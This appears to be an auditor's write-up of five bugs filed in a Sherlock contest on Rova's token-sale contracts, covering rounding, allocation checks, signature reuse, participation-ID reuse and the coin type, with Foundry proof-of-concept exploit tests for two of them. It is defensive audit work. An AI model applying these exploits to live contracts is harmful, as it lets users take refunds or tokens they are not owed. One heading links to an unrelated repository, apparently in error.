# Leaderboard
`Rank 3 / 397`

# Audited Code Repo
### [Sherlock: Rova](https://audits.sherlock.xyz/contests/498)
### [Github: Rova](https://github.com/sherlock-audit/2025-02-rova)

<br>

# <a id="summaryTable"></a>Bugs Filed & Their Status

| #      | Bug ID          | Name | URL    | Adjudged Status  |
|--------|-----------------|------|:------:|-----------------:|
| 1      | [H-01](#h-01)   | Incorrect rounding direction inside calculateCurrencyAmount() allows free token purchase | [28](https://github.com/sherlock-audit/2025-02-rova-judging/issues/28) | Rejected |
| 2      | [H-02](#h-02)   | Min and max user token allocation checked incorrectly inside updateParticipation() | [36](https://github.com/sherlock-audit/2025-02-rova-judging/issues/36) | Med |
| 3      | [M-01](#m-01)   | Signature reuse possible between cancelParticipation() and claimRefund() | [62](https://github.com/sherlock-audit/2025-02-rova-judging/issues/62) | Rejected |
| 4      | [M-02](#m-02)   | updateParticipation() can be called multiple times with the same prevLaunchParticipationId, allowing user to have more than one participation ids | [66](https://github.com/sherlock-audit/2025-02-rova-judging/issues/66) | Rejected |
| 5      | [M-03](#m-03)   | Aptos token used instead of Move token inside `rova_sale.move` | [85](https://github.com/sherlock-audit/2025-02-rova-judging/issues/85) | Rejected |

<br>
<br>

## **HIGH-SEVERITY BUGS**
---

### <a id="h-01"></a>[H-01]
## **Incorrect rounding direction inside calculateCurrencyAmount() allows free token purchase**
#### https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L597
<br>

## Description
[_calculateCurrencyAmount()](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L597) fails to account for rounding up in protocol's favour
when calculating the amount of currency required for a token purchase. The correct implementation ought to be:
```diff
  File: rova-contracts/src/Launch.sol

   595:              /// @notice Calculate currency payment amount based on bps and token amount
   596:              function _calculateCurrencyAmount(uint256 tokenPriceBps, uint256 tokenAmount) internal view returns (uint256) {
-  597:                  return Math.mulDiv(tokenPriceBps, tokenAmount, 10 ** tokenDecimals);
+  597:                  return Math.mulDiv(tokenPriceBps, tokenAmount, 10 ** tokenDecimals, Rounding.Ceil);
   598:              }
```

Consider:
1. `CurrencyConfig` has `tokenPriceBps` set as `0.001 * 1e6 = 1000` i.e. 1 token being sold for 0.001 USDC as per docs [here](https://github.com/dpm-labs/rova-contracts/blob/main/README.md#how-to-calculate-token-price). Token has 8 decimals.
4. User calls `participate()` with a small token amount:
    - token amount = 0.0005e8
    - `_calculateCurrencyAmount()` returns: `(1000 * 0.0005e8) / 1e8 = 0.5e8 / 1e8 = 0 (rounded-down)`
    - On Base chain where gas cost is low, this is an attack vector for the user to get tokens for free. Hence the rounding-up is necessary.

## Impact
User pays less or zero on [participation](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L295), [updateParticipation()](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L376):
```solidity
    295:       IERC20(request.currency).safeTransferFrom(msg.sender, address(this), currencyAmount);
```
and
```solidity
    376:       IERC20(request.currency).safeTransferFrom(msg.sender, address(this), additionalCurrencyAmount);
```

[Back to Top](#summaryTable)
---

### <a id="h-02"></a>[H-02]
## **Min and max user token allocation checked incorrectly inside updateParticipation()**
#### https://github.com/gfx-labs/oku-custom-order-types/blob/b84e5725f4d1e0a1ee9048baf44e68d2e53ec971/contracts/automatedTrigger/Bracket.sol#L539
<br>

## Description
`updateParticipation()` has wrong checks on [L355](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L355) and [L369](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L369) while checking for user token allocation limits. It uses currency figures instead of token values, and should be:
```diff
        // .... inside updateParticipation()

        // If new requested token amount is less than old amount, handle refund
        if (prevInfo.currencyAmount > newCurrencyAmount) {
            // Calculate refund amount
            uint256 refundCurrencyAmount = prevInfo.currencyAmount - newCurrencyAmount;
            // Validate user new requested token amount is greater than min token amount per user
-           if (userTokenAmount - refundCurrencyAmount < settings.minTokenAmountPerUser) {
+           if (request.tokenAmount < settings.minTokenAmountPerUser) {
                revert MinUserTokenAllocationNotReached(
                    request.launchGroupId, request.userId, userTokenAmount, request.tokenAmount
                );
            }
            // Update total tokens requested for user for launch group
-           userTokens.set(request.userId, userTokenAmount - refundCurrencyAmount);
+           userTokens.set(request.userId, request.tokenAmount);
            // Transfer payment currency from contract to user
            IERC20(request.currency).safeTransfer(msg.sender, refundCurrencyAmount);
        } else if (newCurrencyAmount > prevInfo.currencyAmount) {
            // Calculate additional payment amount
            uint256 additionalCurrencyAmount = newCurrencyAmount - prevInfo.currencyAmount;
            // Validate user new requested token amount is within launch group user allocation limits
-           if (userTokenAmount + additionalCurrencyAmount > settings.maxTokenAmountPerUser) {
+           if (request.tokenAmount > settings.maxTokenAmountPerUser) {
                revert MaxUserTokenAllocationReached(
                    request.launchGroupId, request.userId, userTokenAmount, request.tokenAmount
                );
            }
            // Update total tokens requested for user for launch group
-           userTokens.set(request.userId, userTokenAmount + additionalCurrencyAmount);
+           userTokens.set(request.userId, request.tokenAmount);
            // Transfer payment currency from user to contract
            IERC20(request.currency).safeTransferFrom(msg.sender, address(this), additionalCurrencyAmount);
        }

        // .... rest of code
```

## Impact
1. User can breach the user token allocations, OR be stopped from participating even before the limits are breached.
2. Depending on the `tokenPriceBps` i.e. rate of tokens in currency terms and the decimal precision, it could even revert due to underflow on L355. This is because we are trying to deduct `refundCurrencyAmount` (in say, `Eth Mainnet MOVE` with 8 decimals) from `userTokenAmount` (in token terms). For example, if `tokenPriceBps` is 20000 or `1 token = 2 MOVE` and:
    - User participated with purchasing `10` tokens and paying `20` MOVE. Let's say `token` too has 8 decimal precision. 
    - User calls `updateParticipation()` with token amount as `4`
    - He needs to be refunded `20 - 4 * 2 = 12` MOVE
    - L355 calculates `userTokenAmount - refundCurrencyAmount` as `10e8 - 12e8` and reverts due to underflow. 

[Back to Top](#summaryTable)

<br>

## **MEDIUM-SEVERITY BUGS**
---

### <a id="m-01"></a>[M-01]
## **Signature reuse possible between cancelParticipation() and claimRefund()**
#### https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Types.sol#L108-L134
<br>

## Description
The structs for `CancelParticipationRequest` and `ClaimRefundRequest` [are identical](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Types.sol#L108-L134):
```js
    struct CancelParticipationRequest {
        uint256 chainId;
        bytes32 launchId;
        bytes32 launchGroupId;
        bytes32 launchParticipationId;
        bytes32 userId;
        address userAddress;
        uint256 requestExpiresAt;
    }

    struct ClaimRefundRequest {
        uint256 chainId;
        bytes32 launchId;
        bytes32 launchGroupId;
        bytes32 launchParticipationId;
        bytes32 userId;
        address userAddress;
        uint256 requestExpiresAt;
    }
```

This can lead to the following scenario:
1. User gets signature approved from backend for `cancelParticipation()`
2. However, the user does not call the function at this point of time
3. After some time, `OPERATOR_ROLE` calls `finalizeWinners()` with list of winners. User is not one of the winners.
4. `MANAGER_ROLE` then calls `setLaunchGroupStatus()` to mark launchGroup as COMPLETED
5. User back-runs `setLaunchGroupStatus()` and calls `claimRefund()`. User is able to call `claimRefund()` as its [modifier check](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L478) will pass which validates that status is `LaunchGroupStatus.COMPLETED`. The user's approved signature from `cancelParticipation()` can be used here due to the structs being identical. User gets their `currencyAmount` refunded.

Constraint to the attack: the additional condition capable of making this attack infeasible is if the `cancelParticipation()` signature approved by the backend has a `requestExpiresAt` value smaller than the `block.timestamp` of `setLaunchGroupStatus()` being called.

## Impact
Signature reuse across functions/intended actions.

## Proof of Concept
Add this file as `test/SignatureReuse.t.sol` and run to see it pass:
```js
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.22;

import {PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
import {Test} from "forge-std/Test.sol";
import {LaunchTestBase, IERC20Events} from "./LaunchTestBase.t.sol";
import {Launch} from "../src/Launch.sol";
import {
    LaunchGroupSettings,
    LaunchGroupStatus,
    ParticipationRequest,
    CancelParticipationRequest,
    ClaimRefundRequest,
    ParticipationInfo
} from "../src/Types.sol";

contract SignatureReuse is Test, Launch, LaunchTestBase, IERC20Events {
    LaunchGroupSettings public settings;

    function setUp() public {
        _setUpLaunch();

        // Setup initial participation
        settings = _setupLaunchGroup();
        ParticipationRequest memory request = _createParticipationRequest();
        bytes memory signature = _signRequest(abi.encode(request));

        vm.startPrank(user1);
        currency.approve(
            address(launch), _getCurrencyAmount(request.launchGroupId, request.currency, request.tokenAmount)
        );
        launch.participate(request, signature);

        vm.stopPrank();
    }

    function test_SignatureReuseAttack() public {
        // User gets valid signature for cancelParticipation (but doesn't use it yet)
        CancelParticipationRequest memory cancelRequest = _createCancelParticipationRequest();
        bytes memory cancelSignature = _signRequest(abi.encode(cancelRequest));

        vm.startPrank(manager);
        launch.setLaunchGroupStatus(testLaunchGroupId, LaunchGroupStatus.COMPLETED);
        vm.stopPrank();

        // User back-runs setLaunchGroupStatus() by reusing cancelParticipation signature for claimRefund
        vm.startPrank(user1);
        // Create claim refund request with same parameters as cancel request
        ClaimRefundRequest memory claimRequest = ClaimRefundRequest({
            chainId: cancelRequest.chainId,
            launchId: cancelRequest.launchId,
            launchGroupId: cancelRequest.launchGroupId,
            launchParticipationId: cancelRequest.launchParticipationId,
            userId: cancelRequest.userId,
            userAddress: cancelRequest.userAddress,
            requestExpiresAt: cancelRequest.requestExpiresAt
        });

        // Use the cancel signature for claim request
        launch.claimRefund(claimRequest, cancelSignature);
        vm.stopPrank();
    }
}
```

## Mitigation
Include some unique field inside either of the structs so that the signature generated by `keccak256(abi.encode(request))` is unique and not inter-transferable.

[Back to Top](#summaryTable)
---

### <a id="m-02"></a>[M-02]
## **updateParticipation() can be called multiple times with the same prevLaunchParticipationId, allowing user to have more than one participation ids**
#### https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L312
<br>

## Description
[updateParticipation()](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L312) is called with a user-provided `prevLaunchParticipationId`. The token and currency amount of this old participation is set to zero and a new participation id is assigned to the user. As [the docs explain](https://github.com/dpm-labs/rova-contracts/blob/main/README.md#signing-requests):
> prevLaunchParticipationId - (applies to updateParticipation requests) This would come from user input. Before signing, the backend would validate that the prevLaunchParticipationId is valid for the launchGroupId and that it belongs to the user making the request.

The user can do the following in case of a launch group which does not finalize at participation, like a raffle:
1. Call `participate()` with say, 1000 token amount. They are assigned a participation id = 1.
2. User then calls `updateParticipation()` with `prevLaunchParticipationId = 1` and new token amount as 1500. The protocol updates their token amount to 1500 and assigns a new participation id of 2.
3. User calls `updateParticipation()` again with `prevLaunchParticipationId = 1` and new token amount as 200. The creates a new participation id of 3 which has token amount of 200.
4. User now has two participation ids even though only one should be allowed, thus increasing their probability of winning the raffle.

Note that before Step 3, backend has to sign the user request. Even if the backend sees that the `prevLaunchParticipationId` currently has token amount as 0, it should not be a red flag since `settings.minTokenAmountPerUser` is configurable and the launch group could have been set up with this setting as zero.

## Impact
A user is able to create multiple participations in a launch group (e.g. a raffle which does not finalize at participation) and increase their chances of being picked as one of the winners.

## Proof of Concept
Add this file as `test/MultipleUpdates.t.sol` and run to see it pass:
```js
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {LaunchTestBase} from "./LaunchTestBase.t.sol";
import {Launch} from "../src/Launch.sol";
import {
    LaunchGroupSettings,
    LaunchGroupStatus,
    ParticipationRequest,
    UpdateParticipationRequest,
    ParticipationInfo
} from "../src/Types.sol";

contract MultipleUpdates is Test, Launch, LaunchTestBase {
    LaunchGroupSettings public settings;
    ParticipationRequest public initialRequest;
    bytes public initialSignature;

    function setUp() public {
        _setUpLaunch();

        // Setup initial participation
        settings = _setupLaunchGroup();
        initialRequest = _createParticipationRequest();
        initialSignature = _signRequest(abi.encode(initialRequest));

        vm.startPrank(user1);
        currency.approve(
            address(launch),
            _getCurrencyAmount(initialRequest.launchGroupId, initialRequest.currency, initialRequest.tokenAmount)
        );
        launch.participate(initialRequest, initialSignature);
        vm.stopPrank();
    }

    function test_CanReuseParticipationIdMultipleTimes() public {
        // Create first update request
        UpdateParticipationRequest memory firstUpdateRequest = UpdateParticipationRequest({
            chainId: block.chainid,
            launchId: testLaunchId,
            launchGroupId: testLaunchGroupId,
            prevLaunchParticipationId: initialRequest.launchParticipationId,
            newLaunchParticipationId: "newParticipationId1",
            userId: testUserId,
            userAddress: user1,
            tokenAmount: 1500 * 10 ** launch.tokenDecimals(), // Increase token amount
            currency: address(currency),
            requestExpiresAt: block.timestamp + 1 hours
        });
        bytes memory firstUpdateSignature = _signRequest(abi.encode(firstUpdateRequest));

        vm.startPrank(user1);

        // Approve additional tokens for first update
        uint256 firstUpdateCurrencyAmount = _getCurrencyAmount(
            firstUpdateRequest.launchGroupId, firstUpdateRequest.currency, firstUpdateRequest.tokenAmount
        );
        currency.approve(address(launch), firstUpdateCurrencyAmount);

        // Perform first update
        launch.updateParticipation(firstUpdateRequest, firstUpdateSignature);

        // Create second update request using same prevLaunchParticipationId
        UpdateParticipationRequest memory secondUpdateRequest = UpdateParticipationRequest({
            chainId: block.chainid,
            launchId: testLaunchId,
            launchGroupId: testLaunchGroupId,
            prevLaunchParticipationId: initialRequest.launchParticipationId, // Reuse the same prev ID
            newLaunchParticipationId: "newParticipationId2",
            userId: testUserId,
            userAddress: user1,
            tokenAmount: 200 * 10 ** launch.tokenDecimals(),
            currency: address(currency),
            requestExpiresAt: block.timestamp + 1 hours
        });
        bytes memory secondUpdateSignature = _signRequest(abi.encode(secondUpdateRequest));

        // This should succeed even though we're reusing the same prevLaunchParticipationId
        launch.updateParticipation(secondUpdateRequest, secondUpdateSignature);

        vm.stopPrank();

        // Verify that all three participation records exist
        ParticipationInfo memory initialInfo = launch.getParticipationInfo(initialRequest.launchParticipationId);
        ParticipationInfo memory firstUpdateInfo =
            launch.getParticipationInfo(firstUpdateRequest.newLaunchParticipationId);
        ParticipationInfo memory secondUpdateInfo =
            launch.getParticipationInfo(secondUpdateRequest.newLaunchParticipationId);

        // Initial participation should be zeroed out
        assertEq(initialInfo.tokenAmount, 0);
        assertEq(initialInfo.currencyAmount, 0);
        assertEq(initialInfo.userId, testUserId); // But still retain userId
        assertEq(initialInfo.currency, address(currency)); // And currency

        // First update should be valid
        assertEq(firstUpdateInfo.tokenAmount, firstUpdateRequest.tokenAmount);
        assertEq(firstUpdateInfo.userId, testUserId);
        assertEq(firstUpdateInfo.currency, address(currency));

        // Second update should also be valid
        assertEq(secondUpdateInfo.tokenAmount, secondUpdateRequest.tokenAmount);
        assertEq(secondUpdateInfo.userId, testUserId);
        assertEq(secondUpdateInfo.currency, address(currency));
    }
}
```

## Mitigation
Simply reset the `userId` field too inside `updateParticipation()` so that it would fail at [this check: `if (request.userId != prevInfo.userId) {revert UserIdMismatch(prevInfo.userId, request.userId);}`](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L341-L343) if called again:
```diff
    // ... code inside updateParticipation()

        // Reset previous participation info
        prevInfo.currencyAmount = 0;
        prevInfo.tokenAmount = 0;
+       prevInfo.userId = bytes32(0);

        emit ParticipationUpdated(
            request.launchGroupId,
            request.newLaunchParticipationId,
            request.userId,
            msg.sender,
            request.tokenAmount,
            request.currency
        );
    }
```

[Back to Top](#summaryTable)
---

### <a id="m-03"></a>[M-03]
## **Aptos token used instead of Move token inside `rova_sale.move`**
#### https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-movement-contracts/sources/rova_sale.move#L173
<br>

## Description
[README](https://github.com/sherlock-audit/2025-02-rova/blob/main/README.md#q-on-what-chains-are-the-smart-contracts-going-to-be-deployed) states that the Move contract is intended for the Movement chain:
> rova-movement-contracts - Movement

and also that the [only supported token is MOVE token](https://github.com/sherlock-audit/2025-02-rova/blob/main/README.md#q-if-you-are-integrating-tokens-are-you-allowing-only-whitelisted-tokens-to-work-with-the-codebase-or-any-complying-with-the-standard-are-they-assumed-to-have-certain-properties-eg-be-non-reentrant-are-there-any-types-of-weird-tokens-you-want-to-integrate):
> The only supported payment currency is the native MOVE token on Movement

However `rova_sale.move` uses Aptos token as seen [here](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-movement-contracts/sources/rova_sale.move#L12) or [here](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-movement-contracts/sources/rova_sale.move#L173). This won't work on Movement chain.

## Impact
`rova_sale.move` won't work on Movement chain.

## Mitigation
1. Import the Movement framework's MoveCoin module instead of Aptos's AptosCoin
2. Change all token type parameters from AptosCoin to MoveCoin

[Back to Top](#summaryTable)